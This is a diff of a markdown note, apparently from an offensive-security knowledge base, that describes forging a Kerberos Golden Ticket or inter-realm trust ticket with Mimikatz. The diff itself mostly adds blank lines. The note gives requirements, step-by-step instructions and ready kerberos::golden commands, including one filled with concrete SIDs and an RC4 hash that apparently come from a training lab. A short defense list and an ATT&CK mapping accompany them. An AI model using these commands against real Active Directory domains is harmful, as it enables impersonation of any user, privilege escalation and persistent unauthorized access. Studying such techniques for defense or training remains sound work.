@@ -37,11 +37,15 @@ From a technical standpoint, this procedure involves extracting the domain's krb
 
 The business value of this procedure is that it allows attackers to move laterally across a network, gain access to sensitive resources, and escalate privileges.
 
+ 
+
 ## Requirements
 
 1. Valid domain credentials with privileges to extract krbtgt hash
 
 1. Access to a system where Mimikatz can be run
+
+ 
 
 ## Defense
 
@@ -51,20 +55,32 @@ The business value of this procedure is that it allows attackers to move lateral
 
 1. Regularly review and update trust relationships between domains and forests
 
+ 
+
 ## Objectives
 
 1. Gain unauthorized access to resources across different domains or forests
 
 1. Escalate privileges and move laterally across a network
 
+ 
+
 # Instructions
 
 1. Use Mimikatz to create a Kerberos Golden Ticket for a specific domain and target service account using the following command:
 kerberos::golden /domain:<domain_name> /sid:<domain_SID> /rc4:<NTLM_hash_of_the_KrBTGT_account> /user:<target_service_account> /service:krbtgt /target:<target_domain_name> /ticket:<path_to_save_ticket_file>
 
+ 
+
+
+
 **Code**: [[mimikatz(commandline) # kerberos::golden /domain:d]]
 
+
+
 > This command creates a Kerberos Golden Ticket, which is a forged TGT (Ticket Granting Ticket) that can be used to impersonate any domain user, and provides full access to the domain. The command requires the domain name, domain SID, NTLM hash of the KrBTGT account, target service account, target domain name, and a path to save the ticket file. The command uses the Mimikatz tool, which is a post-exploitation tool that allows extracting plaintexts passwords, hash, PIN codes and kerberos tickets from memory. This command can be used for privilege escalation, persistence, and lateral movement.
+
+
 
 **Command** ([[Kerberos Golden Ticket]]):
 
@@ -72,11 +88,17 @@ kerberos::golden /domain:<domain_name> /sid:<domain_SID> /rc4:<NTLM_hash_of_the_
 mimikatz(commandline) # kerberos::golden /domain:domain.local /sid:S-1-5-21... /rc4:HASH_TRUST$ /user:Administrator /service:krbtgt /target:external.com /ticket:c:\temp\trust.kirbi
 ```
 
+
+
+
+
 **Command** ([[Kerberos Golden Ticket]]):
 
 ```bash
 mimikatz(commandline) # kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:moneycorp.local /ticket:c:\ad\tools\mcorp-ticket.kirbi
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -100,3 +122,5 @@ mimikatz(commandline) # kerberos::golden /domain:dollarcorp.moneycorp.local /sid
 - [[Active Directory Attacks]]
 - [[Create a forged trust ticket (inter-realm TGT) using Mimikatz]]
 - [[Forest to Forest Compromise - Trust Ticket]]
+
+
